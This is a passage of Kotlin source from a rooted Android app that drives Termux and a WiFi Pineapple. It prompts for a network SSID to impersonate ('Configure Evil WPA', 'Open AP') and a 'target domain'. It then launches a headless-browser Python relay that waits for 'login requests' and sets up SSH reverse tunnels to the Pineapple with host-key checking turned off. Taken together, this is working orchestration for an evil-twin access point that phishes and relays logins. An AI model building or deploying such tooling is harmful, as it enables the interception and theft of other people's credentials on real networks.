                    echo 'HOSTCHECK:END'
                    rm -f "${'$'}ERR1" "${'$'}ERR2" "${'$'}ERR3"
                """.trimIndent()

                val hostCheckScriptPath = "$TERMUX_HOME/hostkey_check.sh"
                writeFileAsRoot(hostCheckScriptPath, hostCheckScript)
                execAsRoot("chown $termuxUid:$termuxGid $hostCheckScriptPath")
                execAsRoot("chmod 755 $hostCheckScriptPath")

                execAsRoot("sync")
                Thread.sleep(1000)
                execAsRoot("rm -f $TERMUX_HOME/hostcheck_debug.txt")

                appendLog(textView, "⏳ Running host key check...\n")
                val inlineCmd = "/system/bin/nohup /system/bin/setsid $TERMUX_BASH $hostCheckScriptPath > /dev/null 2>&1 &"
                val pipeline = "echo '$inlineCmd' | su $termuxUid -g $termuxGid $termuxGroups -c '/system/bin/sh'"
                val hostCheckProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
                hostCheckProc.waitFor()

                Thread.sleep(2000)

                val maxWaitMs = 30000L
                val startTime = System.currentTimeMillis()
                var scriptDone = false

                while (!scriptDone && isRunning.get() && (System.currentTimeMillis() - startTime) < maxWaitMs) {
                    Thread.sleep(1000)
                    val checkProc = Runtime.getRuntime().exec(
                        arrayOf("su", "-mm", termuxUid, "-c", "grep -q HOSTCHECK:END $TERMUX_HOME/hostcheck_debug.txt 2>/dev/null && echo DONE || echo WAIT")
                    )
                    val checkOut = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }.trim()
                    checkProc.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
                    checkProc.destroy()
                    if (checkOut == "DONE") {
                        scriptDone = true
                    }
                }

                if (!scriptDone) {
                    appendLog(textView, "⚠️ Host check timed out\n")
                    return false
                }

                val readDebugProc = Runtime.getRuntime().exec(
                    arrayOf("su", "-mm", termuxUid, "-c", "cat $TERMUX_HOME/hostcheck_debug.txt")
                )
                val hostCheckOut = BufferedReader(InputStreamReader(readDebugProc.inputStream)).use { it.readText() }
                readDebugProc.waitFor()

                val hostKeyFailed    = hostCheckOut.contains("HOSTKEY_FAILED:YES")
                val pubkeyFailed     = hostCheckOut.contains("PUBKEY_FAILED:YES")
                val hostKeyRemoved   = hostCheckOut.contains("HOSTKEY_REMOVED:YES")
                val newConnectionOk  = hostCheckOut.contains("NEW_CONNECTION_OK:YES")

                if (pubkeyFailed && !newConnectionOk) {
                    appendLog(textView, "⚠️ SSH pubkey authentication failed\n")

                    if (!sshKeyPubExists) {
                        appendLog(textView, "🔑 Public key missing locally — regenerating key pair...\n")
                        val deleteSuccess = deleteSshKeyPair(textView)
                        if (!deleteSuccess) {
                            appendLog(textView, "❌ Failed to delete old key pair\n")
                            return false
                        }
                        val keygenSuccess = generateSshKeyPair(textView)
                        if (!keygenSuccess) {
                            appendLog(textView, "❌ Failed to generate new SSH key\n")
                            return false
                        }
                        appendLog(textView, "✅ New SSH key pair generated\n")
                    }

                    appendLog(textView, "⚙️ Prompting for SSH password to transfer key...\n")
                    val password = promptForPassword(textView, "SSH Password Required",
                        "Enter SSH password for root@$PINEAPPLE_IP:")

                    if (password == null) {
                        appendLog(textView, "❌ Password input cancelled\n")
                        return false
                    }

                    appendLog(textView, "⚙️ Transferring public key to Pineapple...\n")
                    val transferSuccess = transferKeyWithPasswordAndRegenerate(password, textView)
                    if (!transferSuccess) {
                        appendLog(textView, "❌ Failed to transfer SSH key\n")
                        return false
                    }
                    appendLog(textView, "✅ SSH key transferred successfully\n")
                } else if (hostKeyFailed && newConnectionOk) {
                    appendLog(textView, "✅ Fixed host key issue and verified connection\n")
                } else if (!hostKeyFailed && !pubkeyFailed && newConnectionOk) {
                    appendLog(textView, "✅ SSH host key verification passed\n")
                } else if (!newConnectionOk) {
                    appendLog(textView, "⚠️ SSH connection issue detected\n")
                    return false
                }
            }
            return true
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun startRelayService(textView: TextView, domain: String): Boolean {
        try {
            appendLog(textView, "📝 Target domain: $domain\n")
            appendLog(textView, "⚙️ Creating startup script...\n")

            val scriptContent = """
                #!$TERMUX_BASH
                set -e

                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                export TMPDIR="${'$'}HOME/tmp"
                export DISPLAY=:0
                unset MOZ_HEADLESS
                export MOZ_CRASHREPORTER_DISABLE=1

                mkdir -p "${'$'}TMPDIR"
                cd "$TERMUX_HOME"

                echo "Cleaning up previous processes..." > $TERMUX_HOME/cleanup.log
                pkill -9 -f python.*main.py || true
                pkill -9 -f geckodriver || true
                pkill -9 -f firefox || true
                pkill -9 -f com.termux.x11 || true
                pkill -f 'ssh.*$PINEAPPLE_IP' || true

                echo "Cleaning up old log files..." >> $TERMUX_HOME/cleanup.log
                rm -f $TERMUX_HOME/python_output.log
                rm -f $TERMUX_HOME/geckodriver.log
                rm -f $TERMUX_HOME/firefox_test.log

                echo "Waiting for ports to be released..." >> $TERMUX_HOME/cleanup.log
                for i in {1..30}; do
                    PORTS_IN_USE=0
                    nc -z 127.0.0.1 6000 2>/dev/null && { echo "Port 6000 still in use at ${'$'}{i}s" >> $TERMUX_HOME/cleanup.log; PORTS_IN_USE=1; }
                    nc -z 127.0.0.1 4444 2>/dev/null && { echo "Port 4444 still in use at ${'$'}{i}s" >> $TERMUX_HOME/cleanup.log; PORTS_IN_USE=1; }
                    nc -z 127.0.0.1 8080 2>/dev/null && { echo "Port 8080 still in use at ${'$'}{i}s" >> $TERMUX_HOME/cleanup.log; PORTS_IN_USE=1; }
                    nc -z 127.0.0.1 9998 2>/dev/null && { echo "Port 9998 still in use at ${'$'}{i}s" >> $TERMUX_HOME/cleanup.log; PORTS_IN_USE=1; }

                    if [ "${'$'}PORTS_IN_USE" -eq 0 ]; then
                        echo "All ports released after ${'$'}i seconds" >> $TERMUX_HOME/cleanup.log
                        break
                    fi
                    sleep 1
                done
                sleep 2

                echo "Starting X11 server..." > $TERMUX_HOME/x11_output.log
                termux-x11 :0 -ac -listen tcp >> $TERMUX_HOME/x11_output.log 2>&1 &
                X11_PID=${'$'}!
                sleep 3

                echo "Starting geckodriver..." >> $TERMUX_HOME/x11_output.log
                geckodriver --port 4444 --log debug > $TERMUX_HOME/geckodriver.log 2>&1 &
                GECKO_PID=${'$'}!
                sleep 3

                echo "Starting Python relay..." >> $TERMUX_HOME/x11_output.log
                find $TERMUX_HOME -name "*.pyc" -delete 2>/dev/null || true
                find $TERMUX_HOME -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null || true
                python -u "$TERMUX_HOME/main.py" --domain $domain --port 8080 > $TERMUX_HOME/python_output.log 2>&1 &
                PYTHON_PID=${'$'}!

                ALL_PORTS_READY=0
                for attempt in {1..60}; do
                    if nc -z 127.0.0.1 6000 2>/dev/null && nc -z 127.0.0.1 4444 2>/dev/null && nc -z 127.0.0.1 8080 2>/dev/null; then
                        ALL_PORTS_READY=1
                        break
                    fi
                    sleep 1
                done

                if [ "${'$'}ALL_PORTS_READY" -eq 0 ]; then
                    echo "ERROR: Not all ports ready" >> $TERMUX_HOME/x11_output.log
                    exit 1
                fi

                echo "Setting up SSH tunnels..." >> $TERMUX_HOME/x11_output.log
                pkill -f 'ssh.*$PINEAPPLE_IP' || true
                sleep 2

                nohup $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -R 9999:localhost:8080 root@$PINEAPPLE_IP > /dev/null 2>&1 &
                sleep 3

                nohup $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -L 9998:$PINEAPPLE_IP:80 root@$PINEAPPLE_IP > /dev/null 2>&1 &
                sleep 3

                echo "Setup complete!" >> $TERMUX_HOME/x11_output.log
            """.trimIndent()

            writeFileAsRoot(SD_SCRIPT, scriptContent)
            execAsRoot("chmod 644 $SD_SCRIPT")

            try {
                val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                    ?: Intent().apply {
                        setClassName("com.termux", "com.termux.app.TermuxActivity")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                startActivity(termuxLaunch)
                Thread.sleep(1200)
                val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                }
                startActivity(returnIntent)
            } catch (e: Exception) {
                appendLog(textView, "❌ Unable to launch Termux: ${e.message}\n")
                return false
            }

            val preCleanup = """
                kill_port() {
                    PORT=${'$'}1
                    HEX=${'$'}(printf '%04X' ${'$'}PORT)
                    INODE=${'$'}(cat /proc/net/tcp | grep "0100007F:${'$'}HEX" | awk '{print ${'$'}10}')
                    if [ -n "${'$'}INODE" ]; then
                        PID=${'$'}(ls -la /proc/*/fd/* 2>/dev/null | grep "socket:\[${'$'}INODE\]" | grep -o '/proc/[0-9]*' | head -1 | grep -o '[0-9]*')
                        if [ -n "${'$'}PID" ]; then
                            echo "Killing PID ${'$'}PID on port ${'$'}PORT"
                            kill -9 ${'$'}PID || true
                        fi
                    fi
                }
                kill_port 4444
                kill_port 8080
                kill_port 6000
                kill_port 9998
                sleep 1
                pkill -9 -f python.*main.py || true
                pkill -9 -f geckodriver || true
                pkill -9 -f firefox || true
                pkill -9 -f com.termux.x11 || true
                sleep 2
            """.trimIndent()
            val preCleanupProc = Runtime.getRuntime().exec(arrayOf("su", "-c", preCleanup))
            preCleanupProc.waitFor()
            Thread.sleep(3000)

            val pipeline = "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))

            appendLog(textView, "🚀 Services starting...\n")
            appendLog(textView, "⏳ Waiting for Python output log...\n")

            Thread.sleep(3000)

            var logReady = false
            val maxWaitSeconds = 90
            val startTime = System.currentTimeMillis()
            var lastReportedTime = 0L

            while (!logReady && isRunning.get() && (System.currentTimeMillis() - startTime) < maxWaitSeconds * 1000) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000

                val checkScript = """
                    #!/data/data/com.termux/files/usr/bin/bash
                    export HOME=$TERMUX_HOME
                    cd "$TERMUX_HOME"
                    if [ -f $TERMUX_HOME/python_output.log ]; then
                        if [ -s $TERMUX_HOME/python_output.log ]; then
                            echo "FILE_READY"
                        else
                            echo "FILE_EMPTY"
                        fi
                    else
                        echo "FILE_NOT_FOUND"
                    fi
                """.trimIndent()

                val checkPath = "/sdcard/check_python_log.sh"
                writeFileAsRoot(checkPath, checkScript)
                execAsRoot("chmod 644 $checkPath")

                val checkPipeline = "cat $checkPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
                val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }.trim()
                checkProc.waitFor()

                when (checkOutput) {
                    "FILE_READY" -> {
                        logReady = true
                        appendLog(textView, "✅ Python output log detected and ready after ${elapsed}s!\n")
                    }
                    "FILE_EMPTY" -> {
                        if (elapsed - lastReportedTime >= 5) {
                            appendLog(textView, "Log file exists but empty... ${elapsed}s elapsed\n")
                            lastReportedTime = elapsed
                        }
                        Thread.sleep(1000)
                    }
                    else -> {
                        if (elapsed - lastReportedTime >= 5) {
                            appendLog(textView, "Still waiting for log file... ${elapsed}s elapsed\n")
                            lastReportedTime = elapsed
                        }
                        Thread.sleep(2000)
                    }
                }
            }

            if (!logReady) {
                appendLog(textView, "❌ Python output log not ready after $maxWaitSeconds seconds\n")
                appendLog(textView, "⚠️ Services may still be starting. Check manually if needed.\n")
                return false
            }

            Thread.sleep(1000)
            appendLog(textView, "✅ Service started, monitoring will begin...\n")
            return true

        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun monitorPythonOutputWithHealthCheck(textView: TextView): MonitorResult {
        var shouldLaunchX11 = false
        var lastOutputTime = System.currentTimeMillis()
        val healthCheckInterval = 60000L
        var hasReceivedFirstOutput = false

        try {
            val tailScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"
                tail -f $TERMUX_HOME/python_output.log
            """.trimIndent()

            val tailPath = "/sdcard/tail_python_log.sh"
            writeFileAsRoot(tailPath, tailScript)
            execAsRoot("chmod 644 $tailPath")

            val tailPipeline = "cat $tailPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val tailProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", tailPipeline))
            val reader = BufferedReader(InputStreamReader(tailProc.inputStream))

            val outputBuffer = StringBuilder()

            val healthCheckThread = Thread {
                while (isRunning.get()) {
                    Thread.sleep(5000)

                    if (!hasReceivedFirstOutput) {
                        continue
                    }

                    val timeSinceLastOutput = System.currentTimeMillis() - lastOutputTime

                    if (timeSinceLastOutput > healthCheckInterval) {
                        val isAlive = checkPythonProcessAlive()
                        if (!isAlive) {
                            appendLog(textView, "\n⚠️ Python process appears to have stopped!\n")
                            tailProc.destroy()
                            break
                        }
                    }
                }
            }
            healthCheckThread.start()

            reader.use { input ->
                while (isRunning.get()) {
                    val line = input.readLine() ?: break
                    lastOutputTime = System.currentTimeMillis()
                    hasReceivedFirstOutput = true
                    outputBuffer.append(line).append("\n")

                    if (!shouldLaunchX11 &&
                        outputBuffer.contains("Firefox is ready! Waiting for login requests")) {
                        shouldLaunchX11 = true

                        handler.post {
                            try {
                                val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
                                    ?: Intent().apply {
                                        setClassName("com.termux.x11", "com.termux.x11.MainActivity")
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                startActivity(x11Launch)
                            } catch (e: Exception) {
                                // Silently fail
                            }
                        }
                    }

                    val lowerLine = line.lowercase()
                    if (lowerLine.contains("name or service not known") ||
                        lowerLine.contains("temporary failure in name resolution") ||
                        lowerLine.contains("dns") && lowerLine.contains("error")) {
                        appendLog(textView, line + "\n")
                        appendLog(textView, "\n❌ DNS ERROR DETECTED!\n")
                        tailProc.destroy()
                        healthCheckThread.interrupt()
                        return MonitorResult.DNS_ERROR
                    }

                    if (lowerLine.contains("error") || lowerLine.contains("exception") ||
                        lowerLine.contains("failed") || lowerLine.contains("traceback")) {
                        appendLog(textView, line + "\n")

                        if (lowerLine.contains("critical") || lowerLine.contains("fatal") ||
                            lowerLine.contains("unable to connect") || lowerLine.contains("connection refused")) {
                            appendLog(textView, "\n❌ CRITICAL ERROR DETECTED!\n")
                            tailProc.destroy()
                            healthCheckThread.interrupt()
                            return MonitorResult.SERVICE_FAILED
                        }
                    } else {
                        appendLog(textView, line + "\n")
                    }

                    if (outputBuffer.length > 50000) {
                        outputBuffer.delete(0, outputBuffer.length - 40000)
                    }
                }
            }

            healthCheckThread.interrupt()
            tailProc.destroy()

            return if (isRunning.get()) MonitorResult.SERVICE_FAILED else MonitorResult.USER_STOPPED

        } catch (e: Exception) {
            appendLog(textView, "\n⚠️ Monitor exception: ${e.message}\n")
            return MonitorResult.UNKNOWN_ERROR
        }
    }

    private fun checkPythonProcessAlive(): Boolean {
        try {
            val proc = Runtime.getRuntime().exec(
                arrayOf("su", "-mm", "-c", "pgrep -f main.py > /dev/null && echo ALIVE || echo DEAD")
            )
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }.trim()
            proc.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
            proc.destroy()
            return output == "ALIVE"
        } catch (e: Exception) {
            return false
        }
    }

    private fun saveDomain(domain: String) {
        try {
            val saveScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"
                echo "$domain" > $TERMUX_HOME/last-url.txt
            """.trimIndent()

            val savePath = "/sdcard/save_last_url.sh"
            writeFileAsRoot(savePath, saveScript)
            execAsRoot("chmod 644 $savePath")

            val pipeline = "cat $savePath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline)).waitFor()
        } catch (e: Exception) {
            // Ignore save failure
        }
    }

    private fun saveNetworkCredentials(ssid: String, passphrase: String) {
        try {
            val saveScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"

                IFS= read -r -d '' SSID <<'EOF'
                $ssid
                EOF

                printf '%s' "${'$'}SSID" > $TERMUX_HOME/last-ssid.txt

                echo 'SAVE:SUCCESS'
            """.trimIndent()

            val savePath = "/sdcard/save_network_creds.sh"
            writeFileAsRoot(savePath, saveScript)
            execAsRoot("chmod 644 $savePath")

            val pipeline = "cat $savePath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline)).waitFor()
        } catch (e: Exception) {
            // Ignore save failure
        }
    }

    private fun promptForDomain(textView: TextView): String? {
        var lastUrl = ""
        try {
            val readScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"
                if [ -f $TERMUX_HOME/last-url.txt ]; then
                    cat $TERMUX_HOME/last-url.txt
                fi
            """.trimIndent()

            val readPath = "/sdcard/read_last_url.sh"
            writeFileAsRoot(readPath, readScript)
            execAsRoot("chmod 644 $readPath")

            val pipeline = "cat $readPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            lastUrl = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }.trim()
            proc.waitFor()
        } catch (e: Exception) {
            // Continue without hint
        }

        var result: String? = null
        val latch = java.util.concurrent.CountDownLatch(1)
        var dialog: android.app.AlertDialog? = null

        runOnUiThread {
            val input = EditText(this@MainActivity)
            input.hint = "example.com"
            input.inputType = InputType.TYPE_TEXT_VARIATION_URI

            if (lastUrl.isNotEmpty()) {
                input.setText(lastUrl)
                input.selectAll()
            }

            val message = if (lastUrl.isNotEmpty()) {
                "Enter the target domain (https:// will be added automatically):\n\nLast used: $lastUrl"
            } else {
                "Enter the target domain (https:// will be added automatically):"
            }

            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle("Enter Target Domain")
                .setMessage(message)
                .setView(input)
                .setPositiveButton("OK") { _, _ ->
                    var domain = input.text.toString().trim()
                    if (domain.isNotEmpty()) {
                        if (!domain.startsWith("http://") && !domain.startsWith("https://")) {
                            domain = "https://$domain"
                        }
                        result = domain
                    }
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog?.show()
        }

        Thread {
            while (latch.count > 0 && isRunning.get()) {
                Thread.sleep(100)
            }
            if (!isRunning.get()) {
                runOnUiThread { dialog?.dismiss() }
                latch.countDown()
            }
        }.start()

        latch.await()
        return if (isRunning.get()) result else null
    }

    private fun promptForNetworkCredentials(textView: TextView, evilInterface: String): Pair<String, String>? {
        val isOpenAp = evilInterface == "wlan0open" || evilInterface == "wlan0"

        var lastSsid = ""
        try {
            val readScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"
                if [ -f $TERMUX_HOME/last-ssid.txt ]; then
                    cat $TERMUX_HOME/last-ssid.txt
                fi
            """.trimIndent()

            val readPath = "/sdcard/read_network_creds.sh"
            writeFileAsRoot(readPath, readScript)
            execAsRoot("chmod 644 $readPath")

            val pipeline = "cat $readPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            lastSsid = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }.trim()
            proc.waitFor()
        } catch (e: Exception) {
            // Continue without hint
        }

        var result: Pair<String, String>? = null
        val latch = java.util.concurrent.CountDownLatch(1)
        var dialog: android.app.AlertDialog? = null

        runOnUiThread {
            val layout = android.widget.LinearLayout(this@MainActivity)
            layout.orientation = android.widget.LinearLayout.VERTICAL
            layout.setPadding(50, 20, 50, 20)

            val ssidInput = EditText(this@MainActivity)
            ssidInput.hint = "Network SSID"
            ssidInput.inputType = InputType.TYPE_CLASS_TEXT

            val passphraseInput = EditText(this@MainActivity)
            passphraseInput.hint = "Network Passphrase"
            passphraseInput.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

            if (lastSsid.isNotEmpty()) {
                ssidInput.setText(lastSsid)
            }

            layout.addView(ssidInput)
            if (!isOpenAp) {
                layout.addView(passphraseInput)
            }

            val title = if (isOpenAp) "Configure Open AP" else "Configure Evil WPA"
            val message = when {
                isOpenAp && lastSsid.isNotEmpty() -> "Enter the target network SSID:\n\nLast used SSID: $lastSsid"
                isOpenAp -> "Enter the target network SSID to impersonate:"
                lastSsid.isNotEmpty() -> "Enter the target network credentials:\n\nLast used SSID: $lastSsid"
                else -> "Enter the target network credentials that Evil WPA will impersonate:"
            }

            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle(title)
                .setMessage(message)
                .setView(layout)
                .setPositiveButton("OK") { _, _ ->
                    val ssid = ssidInput.text.toString().trim()
                    val passphrase = if (isOpenAp) "" else passphraseInput.text.toString().trim()
                    if (ssid.isNotEmpty() && (isOpenAp || passphrase.isNotEmpty())) {
                        result = Pair(ssid, passphrase)
                    }
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog?.show()
        }

        Thread {
            while (latch.count > 0 && isRunning.get()) {
                Thread.sleep(100)
            }
            if (!isRunning.get()) {
                runOnUiThread { dialog?.dismiss() }
                latch.countDown()
            }
        }.start()

        latch.await()
        return if (isRunning.get()) result else null
    }

    private fun promptForPassword(textView: TextView, title: String, message: String): String? {
        var result: String? = null
        val latch = java.util.concurrent.CountDownLatch(1)
        var dialog: android.app.AlertDialog? = null

        runOnUiThread {
            val input = EditText(this@MainActivity)
            input.hint = "Password"
            input.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle(title)
                .setMessage(message)
                .setView(input)
                .setPositiveButton("OK") { _, _ ->
                    result = input.text.toString()
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog?.show()
        }

        Thread {
            while (latch.count > 0 && isRunning.get()) {
                Thread.sleep(100)
            }
            if (!isRunning.get()) {
                runOnUiThread { dialog?.dismiss() }
                latch.countDown()
            }
        }.start()

        latch.await()
        return if (isRunning.get() && !result.isNullOrEmpty()) result else null
    }

    private fun appendLog(textView: TextView, message: String) {
        runOnUiThread {
            textView.append(message)
            val scrollView = textView.parent as? android.widget.ScrollView
            scrollView?.post {
                scrollView.fullScroll(android.view.View.FOCUS_DOWN)
            }
        }
    }

    private fun generateSshKeyPair(textView: TextView): Boolean {
        try {
            val keygenScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set -e
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "$TERMUX_HOME"
                mkdir -p $TERMUX_HOME/.ssh
                $TERMUX_SSH_KEYGEN -t ed25519 -f $TERMUX_SSH_KEY -N ''
                echo 'KEYGEN:SUCCESS'
            """.trimIndent()

            val keygenPath = "/sdcard/generate_key.sh"
            writeFileAsRoot(keygenPath, keygenScript)
            execAsRoot("chmod 644 $keygenPath")

            val pipeline = "cat $keygenPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()

            return output.contains("KEYGEN:SUCCESS")
        } catch (e: Exception) {
            return false
        }
    }

    private fun deleteSshKeyPair(textView: TextView): Boolean {
        try {
            val deleteScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set -e
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "$TERMUX_HOME"
                rm -f $TERMUX_SSH_KEY $TERMUX_SSH_KEY_PUB
                echo 'DELETE:SUCCESS'
            """.trimIndent()

            val deletePath = "/sdcard/delete_key.sh"
            writeFileAsRoot(deletePath, deleteScript)
            execAsRoot("chmod 644 $deletePath")

            val pipeline = "cat $deletePath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()

            return output.contains("DELETE:SUCCESS")
        } catch (e: Exception) {
            return false
        }
    }

    private fun transferKeyWithPasswordAndRegenerate(password: String, textView: TextView): Boolean {
        try {
            val sshpassScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set +e
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "$TERMUX_HOME"

                if [ ! -f $TERMUX_SSH_KEY_PUB ]; then
                    echo 'SSHPASS:NO_PUBLIC_KEY'
                    exit 1
                fi

                PASS_FILE="$TERMUX_HOME/.ssh_pass_temp"
                $TERMUX_SSHPASS -f "${'$'}PASS_FILE" $TERMUX_SSH -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && cat >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && sync' < $TERMUX_SSH_KEY_PUB 2>/dev/null
                SSHPASS_EXIT=${'$'}?
                rm -f "${'$'}PASS_FILE"

                if [ ${'$'}SSHPASS_EXIT -eq 0 ]; then
                    echo 'SSHPASS:SUCCESS'
                else
                    echo 'SSHPASS:FAILED'
                fi
            """.trimIndent()

            val writePasswordScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                cd "$TERMUX_HOME"
                echo '${password.replace("'", "'\\''")}' > $TERMUX_HOME/.ssh_pass_temp
                chmod 600 $TERMUX_HOME/.ssh_pass_temp
                echo 'PASSWORD_FILE_CREATED'
            """.trimIndent()

            val writePasswordPath = "/sdcard/write_password.sh"
            writeFileAsRoot(writePasswordPath, writePasswordScript)
            execAsRoot("chmod 644 $writePasswordPath")

            val writePasswordPipeline = "cat $writePasswordPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val writePasswordProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", writePasswordPipeline))
            val writePasswordOut = BufferedReader(InputStreamReader(writePasswordProc.inputStream)).use { it.readText() }
            writePasswordProc.waitFor()

            if (!writePasswordOut.contains("PASSWORD_FILE_CREATED")) {
                return false
            }

            val sshpassPath = "/sdcard/sshpass_transfer.sh"
            writeFileAsRoot(sshpassPath, sshpassScript)
            execAsRoot("chmod 644 $sshpassPath")

            val sshpassPipeline = "cat $sshpassPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val sshpassProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", sshpassPipeline))
            val sshpassOut = BufferedReader(InputStreamReader(sshpassProc.inputStream)).use { it.readText() }
            sshpassProc.waitFor()

            if (!sshpassOut.contains("SSHPASS:SUCCESS")) {
                return false
            }

            val verifyScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set +e
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "$TERMUX_HOME"

                rm -f $TERMUX_HOME/verify_result.txt
                $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@$PINEAPPLE_IP true </dev/null 2>/dev/null
                if [ ${'$'}? -eq 0 ]; then
                    echo 'VERIFY:SUCCESS' > $TERMUX_HOME/verify_result.txt
                else
                    echo 'VERIFY:FAILED' > $TERMUX_HOME/verify_result.txt
                fi
            """.trimIndent()

            val verifyPath = "/sdcard/verify_after_transfer.sh"
            val verifyPipeline = "cat $verifyPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"

            writeFileAsRoot(verifyPath, verifyScript)
            execAsRoot("chmod 644 $verifyPath")

            val verifyProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", verifyPipeline))
            verifyProc.waitFor()

            val verifyResultProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat $TERMUX_HOME/verify_result.txt"))
            val verifyOut = BufferedReader(InputStreamReader(verifyResultProc.inputStream)).use { it.readText() }
            verifyResultProc.waitFor()
            execAsRoot("rm -f $TERMUX_HOME/verify_result.txt")

            if (!verifyOut.contains("VERIFY:SUCCESS")) {
                appendLog(textView, "⚠️ SSH connection still failing after key transfer\n")
                appendLog(textView, "🔄 Detected malformed key pair - regenerating keys...\n")

                val deleteSuccess = deleteSshKeyPair(textView)
                if (!deleteSuccess) {
                    appendLog(textView, "❌ Failed to delete malformed keys\n")
                    return false
                }
                appendLog(textView, "✅ Malformed key pair deleted\n")

                val newKeygenSuccess = generateSshKeyPair(textView)
                if (!newKeygenSuccess) {
